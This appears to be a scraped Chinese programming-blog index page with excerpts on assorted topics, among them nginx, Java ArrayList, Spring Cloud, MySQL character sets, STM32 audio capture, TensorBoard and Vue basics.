		 广义表的两种存储结构
链 式 ( 头 尾 链 表 ) 存 储 结 构 ： 使 用 原 子 节 点 ( 长 度 为 2 ) 存 储 值 链式(头尾链表)存储结构：使用原子节点(长度为2)存储值 链式(头尾链表)存储结构：使用原子节点(长度为2)存储值
扩 展 的 线 性 表 存 储 结 构 扩展的线性表存储结构 扩展的线性表存储结构
上图有明显的错误：1就相当于一个新的“头结点”，其中不能存数据，一下为更新 头尾链表存储结构:将元素和子表“下放” 扩展的线性表存储结构:将子表“下放” 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e676f40f929455803551246bcc909b95/" rel="bookmark">
			如何查看nginx的安装位置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1.1 终极方法1.2 常规的方法 1.1 终极方法 以编译安装的nginx为例
[root@node21 ~]# nginx -h nginx version: nginx/1.18.0 Usage: nginx [-?hvVtTq] [-s signal] [-c filename] [-p prefix] [-g directives] Options: -?,-h : this help -v : show version and exit -V : show version and configure options then exit -t : test configuration and exit -T : test configuration, dump it and exit -q : suppress non-error messages during configuration testing -s signal : send signal to a master process: stop, quit, reopen, reload -p prefix : set prefix path (default: /data/nginx/nginx-1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e676f40f929455803551246bcc909b95/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5025916699456b80acdd3180e5372a4a/" rel="bookmark">
			为什么打印ArrayList对象输出的不是地址?
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		为什么在打印一个ArrayList对象时,输出的不是此对象的地址,而是该集合中的值?是如何实现的?
分析: Object类是Java中其他所有类的基类，没有Object类Java面向对象无从谈起,所有类都是Object类的直接子类或间接子类
而在Object类的toString()方法中,返回的是 getClass().getName() + "@" + Integer.toHexString(hashCode())也就是地址值,打印ArrayList对象没有输出地址值,便可知道ArrayList重写了toString()方法.
查看源码: 点击ArrayList查看源码,发现其中并没有toString()方法,查看他的父类在父类AbstractList中查找,依然没有,在查看上一层父类在AbstractList的父类AbstractCollection查找,果然发现重写了 /** * Returns a string representation of this collection. The string * representation consists of a list of the collection's elements in the * order they are returned by its iterator, enclosed in square brackets * (&lt;tt&gt;"[]"&lt;/tt&gt;). Adjacent elements are separated by the characters * &lt;tt&gt;", "&lt;/tt&gt; (comma and space). Elements are converted to strings as * by {@link String#valueOf(Object)}.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5025916699456b80acdd3180e5372a4a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/020b57af25be51ca6cd4bf2955beb9f5/" rel="bookmark">
			springboot 连接数据库失败取消自动重试，DruidDataSource取消自动重试
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		默认是无限自动重试，导致程序卡死，那么如果我不想让它重试呢?
方案1：
application.properties里面添加即可
spring.datasource.druid.break-after-acquire-failure=true spring.datasource.druid.connection-error-retry-attempts=1 方案2：动态数据源解决方案
DruidDataSource druidDataSource=new DruidDataSource(); druidDataSource.setUrl(dbInfo.getUrl()); druidDataSource.setUsername(dbInfo.getUserName()); druidDataSource.setPassword(dbInfo.getPassword()); druidDataSource.setConnectionErrorRetryAttempts(1); //失败后重连次数 druidDataSource.setBreakAfterAcquireFailure(true); 完成了，只会试一次，不成功不会无限尝试
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/95bb8cf26b44307427a93a8d898cd765/" rel="bookmark">
			iPhone 各大机型设备号
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 一般人真不用关心这个，关心这个的可能是开发者。
iPhone1,1 iPhone 2GiPhone1,2 iPhone 3GiPhone2,1 iPhone 3GSiPhone3,1 iPhone 4 (GSM)iPhone3,2 iPhone 4 (GSM Rev. A)iPhone3,3 iPhone 4 (CDMA)iPhone4,1 iPhone 4SiPhone5,1 iPhone 5 (GSM)iPhone5,2 iPhone 5 (Global)iPhone5,3 iPhone 5C (GSM)iPhone5,4 iPhone 5C (Global)iPhone6,1 iPhone 5S (GSM)iPhone6,2 iPhone 5S (Global)iPhone7,1 iPhone 6 PlusiPhone7,2 iPhone 6iPhone8,1 iPhone 6siPhone8,2 iPhone 6s PlusiPhone8,4 iPhone SEiPhone9,1 iPhone 7iPhone9,3 iPhone 7iPhone9,2 iPhone 7 PlusiPhone9,4 iPhone 7 PlusiPhone10,1 iPhone 8iPhone10,4 iPhone 8iPhone10,2 iPhone 8 PlusiPhone10,5 iPhone 8 PlusiPhone10,3 iPhone XiPhone10,6 iPhone XiPhone11,2 iPhone XSiPhone11,8 iPhone XRiPhone11,6 iPhone XS MaxiPhone12,1 iPhone 11iPhone12,3 iPhone 11 ProiPhone12,5 iPhone 11 Pro MaxiPhone12,8是是iPhoneSE2iphone13,1 是 12miniiphone13,2 是 12iphone13,3 是 12proiphone13,4 是 12pro max 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bc96a5f8a0287850e00b539561e8654b/" rel="bookmark">
			C语言中将字符串转换为数字
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		下列函数可以将字符串转换为数字： 函数名 作 用
atof() 将字符串转换为双精度浮点型值
atoi() 将字符串转换为整型值
atol() 将字符串转换为长整型值
strtod() 将字符串转换为双精度浮点型值，并报告不能被转换的所有剩余数字
strtol() 将字符串转换为长整值，并报告不能被转换的所有剩余数字
strtoul() 将字符串转换为无符号长整型值，并报告不能被转换的所有剩余数字 （1）下面的实例演示了 atof() 函数的用法。
#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; int main() { float val; char str[20]; strcpy(str, "98993489"); val = atof(str); printf("字符串值 = %s, 浮点值 = %f\n", str, val); strcpy(str, "runoob"); val = atof(str); printf("字符串值 = %s, 浮点值 = %f\n", str, val); return(0); } 编译并运行上面的程序，产生以下结果：
字符串值 = 98993489, 浮点值 = 98993488.000000 字符串值 = runoob, 浮点值 = 0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bc96a5f8a0287850e00b539561e8654b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ed96caa0f4580cc4f7058a58283b3f0d/" rel="bookmark">
			springcloud框架搭建遇见的问题及解决办法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1springcloud集成Spring Security后启动客户端，无法在注册中心完成注册，并在控制台报错，报错信息如下：
com.netflix.discovery.shared.transport.TransportException: Cannot execute request on any known server at com.netflix.discovery.shared.transport.decorator.RetryableEurekaHttpClient.execute(RetryableEurekaHttpClient.java:112) ~[eureka-client-1.9.25.jar:1.9.25] at com.netflix.discovery.shared.transport.decorator.EurekaHttpClientDecorator.register(EurekaHttpClientDecorator.java:56) ~[eureka-client-1.9.25.jar:1.9.25] at com.netflix.discovery.shared.transport.decorator.EurekaHttpClientDecorator$1.execute(EurekaHttpClientDecorator.java:59) ~[eureka-client-1.9.25.jar:1.9.25] at com.netflix.discovery.shared.transport.decorator.SessionedEurekaHttpClient.execute(SessionedEurekaHttpClient.java:77) ~[eureka-client-1.9.25.jar:1.9.25] at com.netflix.discovery.shared.transport.decorator.EurekaHttpClientDecorator.register(EurekaHttpClientDecorator.java:56) ~[eureka-client-1.9.25.jar:1.9.25] at com.netflix.discovery.DiscoveryClient.register(DiscoveryClient.java:873) ~[eureka-client-1.9.25.jar:1.9.25] at com.netflix.discovery.InstanceInfoReplicator.run(InstanceInfoReplicator.java:121) [eureka-client-1.9.25.jar:1.9.25] at com.netflix.discovery.InstanceInfoReplicator$1.run(InstanceInfoReplicator.java:101) [eureka-client-1.9.25.jar:1.9.25] at java.util.concurrent.Executors$RunnableAdapter.call(Unknown Source) [na:1.8.0_131] at java.util.concurrent.FutureTask.run(Unknown Source) [na:1.8.0_131] at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.access$201(Unknown Source) [na:1.8.0_131] at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.run(Unknown Source) [na:1.8.0_131] at java.util.concurrent.ThreadPoolExecutor.runWorker(Unknown Source) [na:1.8.0_131] at java.util.concurrent.ThreadPoolExecutor$Worker.run(Unknown Source) [na:1.8.0_131] at java.lang.Thread.run(Unknown Source) [na:1.8.0_131] 问题原因：由于引入了安全验证，而springcloud2.0以后增加security默认启用了csrf检验，需要把eurekaServer端配置security的csrf验证关闭
解决方法：在eurekaServer端的启动类中加入如下代码后，问题解决，
/** * Hello world! * */ @EnableEurekaServer @SpringBootApplication public class AppServer { public static void main( String[] args ) { SpringApplication.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ed96caa0f4580cc4f7058a58283b3f0d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a74fef0c59716fe454bf77195523caf1/" rel="bookmark">
			blast 简单使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		安装 可以用conda安装
构建本地比对库 收集mask信息 为了屏蔽简单重复序列的干扰，需要收集mask信息。
核酸序列 算法有windomasker和dustmasker两种。
此处用的是dustmasker.
dustmasker -in genome.fasta -infmt fasta -parse_seqids -outfmt maskinfo_asn1_bin -out dust.asnb -in:输入文件
-infmt: 输入文件格式
-parse_seqids：按序列id解析，此外用了，下面也要用，保持一致
-outfmt：输出文件格式
-out：输出文件名
蛋白序列 segmasker -in peptide.fasta -infmt fasta -parse_seqids -outfmt maskinfo_asn1_bin -out peptide_seg.asnb &gt; seg.log 2&gt;&amp;1 &amp; 创建本地数据库 makeblastdb -in genome.fasta -input_type fasta -dbtype nucl -parse_seqids -mask_data dust.asnb -out genome makeblastdb -in peptide.fasta -input_type fasta -dbtype prot -parse_seqids -mask_data peptide_seg.asnb -out peptide -dbtype：数据库类型地：nucl(核酸)、prot(蛋白)
-mask_data：上一步收集的mask信息
查看数据库信息 blastdbcmd -db blastdatabse -info megablast MegaBlast 是blastn的一个功能，相比于经典balstn更快.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a74fef0c59716fe454bf77195523caf1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2746fa884470b8f2b67629b7ea2a89c4/" rel="bookmark">
			请领导审阅并提意见应怎么说_职场沟通技巧：与上司见解不同该怎么表述？聪明职场人都会这样做...
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		身在职场，谁都避免不了要与自己的上级沟通思想、交流工作，交流的效果将直接影响到个人前途的发展。在工作中，和上司意见不同时，据理力争会引起上司对你的不悦，但一味顺从也并没有好果子吃。所以，最好的办法就是委婉巧妙地与上司沟通，这样不仅可以减少矛盾与冲突的发生，还能使双方的关系更加和谐融洽，从而有利于自己获得更多加薪晋升的机会。
针对工作上的事，作为下属要敢于向上司表达自己的不同见解，并有能力提出自己的建议。但要做到这一点，必须要注意给上司提意见和建议的方法和技巧。委婉的表达自己的意见，才能在职场中左右逢源、游刃有余。这既能适时适度地表达自己的见解和观点，提升个人职业能力，实现个人价值，同时也能得到领导和同事的好感和赏识，增进与领导的关系。如果不估计领导的想法和感受，随心所欲地想怎么说就怎么说，不注意表达技巧，即使意见再正确，也只能被领导束之高阁，甚至因为你不恰当的言行，伤及领导的颜面和自尊，既不利于维护领导形象，也很可能因此得罪领导，造成人际关系的紧张，给自己的职场发展埋下不必要的隐患和障碍。
跟上司表达不同意见时，我们通常都会用委婉、商量的口吻，不能直接反对，显得唯我独尊，主观武断，这会让上司感觉不舒服，也不符合下属的身份。即使上司对所提意见不同意，也不要立即反驳、争辩。
在提出反对的理由前，先要检讨自己的不足，不要过于显示自己的聪明，这样容易给上司造成难堪，产生不良后果。
局里召集各科室的负责人开会，局长准备在会上听取各部门前一段工作汇报以及安排下一阶段的工作任务，在各部门负责人轮流发言过程中，有几位部门负责人责任心不强，工作没做好，结果局长大发雷霆，使会议气氛十分紧张，还有几个原来准备发言的负责人，都不敢做声了。
局长助理小赵目睹此景便建议休会。在休息的间歇，小赵写了一张纸条递到局长手里，上面写着：“局长，刚才的会议气氛有点紧张，很多部门负责人还没有汇报工作，这不利于会议顺利进行，有些问题似乎应留到会后再开专门会议单独解决。”
会议开始后，小赵发现局长不仅耐心听完了所有负责人的汇报，并把下一阶段的工作任务做了顺利安排，情绪已恢复了正常。会后局长笑着对小王说：“多亏了你的‘清凉剂’，才让我迅速‘退了烧’。”
小王在领导发火后，建议立即休会，趁休会时向局长委婉地表达自己的建议，不仅保全了局长的面子，还让局长消了气，使会议得以顺利开完，自然让局长对其格外赏识。由此可见，向上司表达不同意见，一定要讲究原则，既要让上司愉悦地接受，又不损上司的颜面，委婉的表达方式能收到一举兼得的效果。即便是上司真有不对之处，也要通过曲线劝谏的方法让对方自己意识到错误所在，切不可当面直说，这样既能让上司接受你的意见，又能让其明白你的忠心。
聪明的下属在给上司提意见相左的建议时，总会事先了解上司的真实想法，先站在上司的立场作为立足点，然后在沟通的过程中，先求同，再存异，让上司感觉到你是理解他的想法的，在心理上自然会跟你亲近，这时再委婉地提出自己的想法，同时也要提出，自己是从为上司考虑的目的出发，打消上司对你的疑虑和戒心，更容易接受你的观点和意见，从而更易受到上司的信任与重用。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6bab4cd06f914e6a6032e780210b54c7/" rel="bookmark">
			mysql 5.6 版本查看和修改字符集
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		mysql 5.6 修改字符集
1.查看字符集：
show variables like 'character%'; show variables like '%char%'; 默认的是客户端和服务器都用了latin1,所以中文会乱码。
2.修改字符集
修改/etc/my.cnf配置文件
[mysqld] character_set_server=utf8 collation-server=utf8_general_ci ...... [client] #设置客户端字符集 default-character-set=utf8 再次查看字符集
mysql&gt; show variables like "%char%"; +--------------------------+----------------------------+ | Variable_name | Value | +--------------------------+----------------------------+ | character_set_client | utf8 | | character_set_connection | utf8 | | character_set_database | utf8 | | character_set_filesystem | binary | | character_set_results | utf8 | | character_set_server | utf8 | | character_set_system | utf8 | | character_sets_dir | /usr/share/mysql/charsets/ | +--------------------------+----------------------------+ 8 rows in set (0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6bab4cd06f914e6a6032e780210b54c7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1b95f9fc3c4c537821afb91aafb0f433/" rel="bookmark">
			HTML：HTML界面实现HTML代码编译运行界面
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		结合EasyUI一起写的 运行效果 核心代码 &lt;section class="main_right" id="main_right"&gt; &lt;div id="code-test" class="easyui-panel code_test" style="height: 100%;width: 100%;position: relative" title="代码验证"&gt; &lt;div class="code-test-left"&gt; &lt;textarea id="textareaCode" onkeypress="coded()"&gt; &lt;!DOCTYPE html&gt; &lt;html lang="en"&gt; &lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;EasyUI和Highcharts介绍与使用&lt;/title&gt; &lt;link rel="stylesheet" href="./css/main.css"&gt; &lt;link rel="stylesheet" href="./js/jquery-easyui-1.7.0/themes/default/easyui.css"&gt; &lt;link rel="stylesheet" href="./js/jquery-easyui-1.7.0/themes/icon.css"&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt; &lt;script src="js/jquery-easyui-1.7.0/jquery.min.js"&gt;&lt;/script&gt; &lt;script src="js/jquery-easyui-1.7.0/jquery.easyui.min.js"&gt;&lt;/script&gt; &lt;script src="js/json.js"&gt;&lt;/script&gt; &lt;script src="js/main.js"&gt;&lt;/script&gt; &lt;/html&gt; &lt;/textarea&gt; &lt;/div&gt; &lt;div class="code-test-right"&gt; &lt;div id='textareaCoded' class="textareaCoded"&gt; &lt;p id='html_code'&gt; 请输入你的HTML/CSS代码 &lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;a id="codeButton" href="#" class="easyui-linkbutton codeButton" data-options="iconCls:'icon-edit'"&gt;编译&lt;/a&gt; &lt;/div&gt; &lt;/section&gt; css .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1b95f9fc3c4c537821afb91aafb0f433/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3263126237ec95a55fb7259bfbce377d/" rel="bookmark">
			使用STM32的DFSDM外设来驱动PDM麦克风进行音频采集
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		0、前言 最近需要使用STM32L4系列来完成音频采集的工作，前前后后一共尝试了三种方案，最终在各种测试条件以及功耗等原因下，选择了目前这个方案。
主控使用的是STM32L475RCT6（无需一致，只要有DFSDM即可），MEMS麦克风使用的是ST的MP45DT02TR-M（某宝4.5一片）。
先说一下最终的效果，最终实现在8KHz采样率下，系统能正常工作，整体功耗大约为8mW。
1、之前的两种方案 最开始所使用的是INMP441麦克风，这款MEMS传感器使用I2S总线来驱动，使用单片机SAI外设给传感器相应的脉冲，其能输出1bit的PDM数据，然而对于本人实际使用来说，需将PDM数据流转化为PCM数据流才行。这里借鉴了ST官方Discover开发板的例程，使用ST官方提供的已加密的PDMtoPCM软件包，调用相应的滤波器来对PDM数据流进行过采样，最终输出PCM数据流。不过在调试过程中，噪音较大，自己目前尚不能对多余得到噪音进行消除，于是开始考虑第二种方案。
第二种方案是借鉴正点原子的潘多拉开发板，使用驻体麦克风方案。需要一个音频芯片ES8388，还需要一个咪头，以及比较复杂的外围电路，原理图如下图所示，
还有一点，ES8388是QFN封装，如果焊接不到位很容易导致虚焊（本人因为虚焊导致IIC一直无法应答，一度怀疑自己的IIC驱动是否有问题，从硬件IIC换到软件IIC还是不能解决，把芯片吹掉重新焊才解决问题）。这个方案需要使用IIC来进行音频芯片的控制字写入，然后使用STM32的SAI外设来进行数据采集。芯片内部集成了降噪等功能，单片机所采集的数据就是PCM格式的，这样直接将采集到的的数据发送计科，很是方便。不过也有不好的地方，在本人的实际测试过程中，其无法防震，震动会印象麦克风的收音效果，很容易失真（也可能是本人的处理不到位，不过在测试过程中确实存在这个影响）。如下图所示
还有一点就是使用本方案，PCB的尺寸较大，由于被外设所要求的频率限制，无法将主频进一步降低，为了低功耗，还需要将ES8388的DAC功能关闭，本人所调试的功耗极限值是8KHz采样率下30mW左右。
最终是参考了ST官方的NUCLEO开发板的例程，使用DFSDM来对PDM数据流进行抽样，来获得PCM数据流。
2、PDM？PCM？ 什么是PDM？这里转载别人的一段话，解释的很明白。请参见https://www.cnblogs.com/pingwen/p/11301935.html。
PDM调制器将缓冲模拟信号转换为串行脉冲密度调制信号，时钟输入（ CLK）用于控制PDM调制器。
PDM信号无法直接驱动DA进行声音播放，PDM信号要变为声音信号还需要进行下采样，经过一次低通滤波和抽样，然后成为PCM信号。
PDM是一种调制形式，用于表示数字域中的模拟信号。它是1位数字采样的高频数据流。在PDM信号中，脉冲的相对密度对应于模拟信号的幅度。大量的1s对应于高（正）幅度值，而大量的0s对应于低（负）幅度值，交替的1s和0s对应于幅度值0。
PDM转为PCM信号，需要进行滤波和抽取。
3、DFSDM？ 什么是DFSDM？
PDM转为PCM信号，需要进行滤波和抽取。
根据音频应用领域的标准化规定，PDM调制（脉冲密度调制）是数字麦克风的常见输出格式。PDM信号相当于∑∆调制信号，因此，DFSDM支持PDM信号。
数字麦克风是使用半导体技术制造的MEMS器件（微机电系统）。此类麦克风的有源致动器包括一张膜和一对微电极， 其中一个电极是固定的，另一个电极结合在膜内。当空气压力（声音）施加到膜上时，移动电极远离其默认位置，两个电极之间产生电容变化。感应信号由内置电子处理，作为PDM调制信号输出（脉冲密度调制）。
数字麦克风需要外部时钟信号（麦克风CLK输入信号），数据作为PDM调制信号，通过DATA输出线发送。时钟速度的范围通常介于1至3.2 MHz之间。DFSDM_CKOUT输出信号提供时钟信号，后者将麦克风输出数据速率定义至DFSDM。
DFSDM可通过一条线路并联2个麦克风（立体声配置：左右声道）。两个麦克风共用数据和时钟信号。时钟信号从DFSDM_CKOUT引脚分配到左右麦克风。来自两个麦克风的输出数据信号在同一条线路上复用：左侧麦克风在时钟上升沿提供数据，右侧麦克风在时钟下降沿提供数据（参见 图 27 ）。左声道或右声道麦克风的配置通常是通过在麦克风上配置引脚来实现的（L/R选择引脚）。
DFSDM将DATA线上的两个麦克风信号进行分离。可以重定向DFSDM声道x的输入，以便将此声道 (x+1) 作为输入。接下来，将声道x配置为在上升沿进行数据采样，将声道(x+1)配置为在下降沿进行数据采样。两个声道的时钟信号相同，且内部连接至DFSDM_CKOUT信号。通过此配置，声道x从左侧麦克风接收数据，而声道(x+1)从右侧麦克风接收数据。两个声道向各自的数字滤波器馈送数据，最终为左右麦克风声道输出两个独立的并联数据流。参见图 28，了解使用DFSDM的立体声麦克风应用的完整图形。
DFSDM可以通过DFSDM_CKOUT引脚提供的时钟信号，为外部∑∆调制器提供时钟。此引脚的时钟频率决定了输入采样频率，后者也取决于输出数据速率频率。可以选择以下一种时钟源，用于驱动DFSDM_CKOUT：
• DFSDM 时钟：
– APB 时钟
– 系统时钟（独立于APB时钟分频器）
• PLL时钟（用于I2S的音频PLL）
将所选时钟源的频率除以2-256范围内的因数（根据DFSDM_CHyCFGR1寄存器中的CKOUTDIV字段设置的预分频比），得到DFSDM_CKOUT频率。
4、使用DFSDM驱动PDM麦克风分辨率 DFSDM 具有 24 位数据寄存器，可通过配置实现不同分辨率的支持，有效数据最高支持到 24 位。同时，新的HAL 库支持全硬件获取 16 位采样数据，不增加 CPU 负载。DFSDM 分辨率由过采样率，滤波器类型和右移位器决定。
在此处增加关于分辨率的解释。
参见积分器最大数据表。
Filter 过采样率(FOSR)积分器率 过采样率(IOSR)Sinc^1Sinc^2FastSincSinc^3Sinc^4Sinc^5xy± x ▪ y± x^2 ▪ y± 2x^2 ▪ y± x^3 ▪ y± x^4 ▪ y± x^5 ▪ y 在本次实验中，FOSR使用的是128，IOSR为1，采用Sinc^4滤波，所以输出的数值范围在±268,435,456，也就是精度可达到29bit。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3263126237ec95a55fb7259bfbce377d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8a8cfe1a4149280833b748ab6b78958d/" rel="bookmark">
			从tensorflow的meta文件查看构建的网络模型结构
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		当手上只要保存过训练模型（XXX.index 、XXX.meta等文件），却忘记自己之前神经网络的结构是什么样子的时候怎么办？
第一步：运行下面代码：
import tensorflow as tf g = tf.Graph() with g.as_default() as g: tf.train.import_meta_graph('your_mata_file.meta') with tf.Session(graph=g) as sess: file_writer = tf.summary.FileWriter(logdir='./your_out_file', graph=g) 生成一个./your_out_file文件
第二步：
1、ssh -L 16006:127.0.0.1:6006 xxx@IP
2、进入程序文件输入tensorboard --logdir="./your_out_file"
3、在本地网页输入http://127.0.0.1:16006
最后就可以在Tensorboard里看到自己的网络图结构了^_^
参考方法：
https://blog.csdn.net/qq_16234613/article/details/83013436
https://blog.csdn.net/wws_922/article/details/89226336
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/05e378b04d8bdf35047070371ef3ec05/" rel="bookmark">
			工业相机的传输接口作用以及区别分析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		转载于：https://blog.csdn.net/qq_45780653/article/details/108450489
工业相机的各种接口都有哪些利弊
工业相机分为模拟相机、数字相机。其中数据传输方式大致有：USB2.0、USB3.0、HDMI、WiFi、1394A、1394B、GIGE千兆网、Camera Link等多种类型的接口。而各种接口都有其利弊。
1、USB2.0接口
USB2.0接口的工业相机，是目前最为普通的类型。许多厂商都生产此接口的相机。连我们常用的摄像头，也都是USB2.0接口的。其优点是所有电脑都配置有USB2.0接口，方便连接，不需要采集卡；缺点是其传输速率较慢，理论速度只有480Mb（60MB），由于其糟糕的协议（Bulk-Only Transport(BOT)协议）与编码方式，数据只有30MB/S左右。
USB接口的相机通常没有坚固螺丝，因此在经常运动的设备上，可能会有松动的危险，这也是其一个不足之处。
2、USB3.0接口
USB 3.0的设计在USB 2.0的基础上新增了两组数据总线，为了保证向下兼容，USB 3.0保留了USB 2.0的一组传输总线。在传输协议方面，USB 3.0除了支持传统的BOT协议，还新增了USB Attached SCSI Protocol（USAP），可以完全发挥出5Gbps的高速带宽优势。目前虽然市面上还没有太多的USB3.0相机出现，不过现在国内外的工业相机厂商都在积极推进，而且有些厂商已经有相关的样机出现。
3、HDMI
HDMI(High Definition Multimedia Interface)是一种采用数字化视频/音频接口技术高清晰度多媒体接口，HDMI可以满足1080P的分辨率，是适合影像传输的专用型数字化接口，其可同时传送无压缩的音频和影音信号，最高数据传输速度为5Gbps。同时无需在信号传送前进行数/模或者模/数转换。另外采用HDMI规格接口的线缆没有长度的限制，HDMI最远可传输15米。
4、WiFi
WiFi相机通过增加WIFI模块实现了无线传输功能，可以让相机轻松应用于需要无线传输的场合，解除对距离要求的难题。
5、1394（火线）
1394接口，在工业领域中，应用还是非常广泛的。协议、编码方式都非常不错，传输速度也比较稳定，只不过由于早期苹果的垄断，造成其没有被广泛应用。在工业中，常用的是400Mb的1394A和800Mb的1394B接口。超过800Mb以上的也有，如3.2Gb的，但是比较少见。1394接口，特别是1394B口，都有坚固的螺丝。1394接口不太方便的地方是其未能普及，因此电脑上通常不包含其接口，因此需要额外的采集卡。1394接口，需要注意一下其Packet Size数据包大小设置。Packet Size是整个1394总线的带宽。
6、GIGE千兆网
千兆网接口的工业相机，应用中还是非常多的。一般来讲，连接到千兆网卡上，即能正常工作。但是需要注意一些特殊的细节，如早期的NI的软件，可能对千兆网卡的芯片有要求，需要使用INTEL的芯片才可以正常驱动GIGE相机，而使用如Realtek的芯片网卡，就无法响应。另外在千兆网卡的属性中，也有与1394中的Packet Size类似的巨帧。设置好此参数，可以达到更理想的效果。
7、Camera Link
Camera Link接口的相机，实际应用中比较少。不过其传输速度是目前的工业相机中最快的一种总线类型。一般用于高分辨率高速面阵相机，或者是线阵相机上。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c0314441b565a516c3d9e032fb17961a/" rel="bookmark">
			vue知识点(上）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		vue介绍 前端js框架 js框架：jQuery …… MVVM模式 M	V	VM 双向绑定 视图和数据模型的双向绑定。 渐进式框架 逐步学习这个框架 数据 当vue实例被创建时，它会尝试获取在data中定义的所有属性，用于视图的渲染，并且监视data中的属性变化，当data发生改变，所有相关的视图都将重新渲染，这就是“响应式”系统。
html:
&lt;div id="app"&gt; &lt;input type="text" v-model="name"/&gt; &lt;/div&gt; js:
var vm = new Vue({ el:"#app", data:{ name:"名字" } }) name的变化会影响到input的值
input中输入的值，也会导致vm中的name发生改变
方法 Vue实例中除了可以定义data属性，也可以定义方法，并且在Vue的作用范围内使用。
html：
&lt;div id="app"&gt; &lt;button v-on:click="add"&gt;点我&lt;/button&gt; &lt;/div&gt; js:
var vm = new Vue({ el:"#app", data:{ }, methods:{ add:function(){ console.log("点我了...233") } } }) 生命周期钩子 生命周期
每个Vue实例在被创建时都要经过一系列的初始化过程：创建实例，装载模板，渲染模板等。Vue为生命周期中的每个状态都设置了钩子函数（监听函数）。每当Vue实例处于不同的生命周期时，对应的函数就会被触发调用。
所有的生命周期钩子自动绑定this上下文到实例中，因此你可以访问数据，对属性和方法进行运算。这意味着你不能使用箭头函数来定义一个生命周期方法（例如created：（）=&gt;this.fetchTodos()).这是因为箭头函数绑定了父上下文，因此this与你期待的Vue实例不同，this.fetchTodos的行为未定义。 钩子函数 例如：created代表在vue实例创建后；
可以在Vue中定义一个created函数，代表这个时期的构造函数；
创建实例html页面如下：
var app = new Vue({ el:"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c0314441b565a516c3d9e032fb17961a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2045407d42416bba945662016090eca5/" rel="bookmark">
			网络中的各层与http、https等协议
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		网络协议概述
OSI是一个开放性的通信系统互连参考模型，他是一个定义得非常好的协议规范。OSI模型有7层结构，每层都可以有几个子层。 OSI的7层从上到下分别是 7 应用层 6 表示层 5 会话层 4 传输层 3 网络层 2 数据链路层 1 物理层；
其中高层（即7、6、5、4层）定义了应用程序的功能，下面3层（即3、2、1层）主要面向通过网络的端到端的数据流。
通常把567归为一层的协议图示：
一、物理层（physical layer）
定义：定义了物理设备标准，如网线的接口类型、光纤的接口类型、各种传输介质的传输速率等。它的主要作用是传输比特流（就是由1、0转化为电流强弱来进行传输,到达目的地后在转化为1、0，也就是我们常说的数模转换与模数转换），这一层的数据叫做比特。物理层常用多个规范完成对所有细节的定义。
二、链路层（link layer）：本地地址（邮差）
以太网(Ethernet)和WiFi是现在最常见的链路层协议。
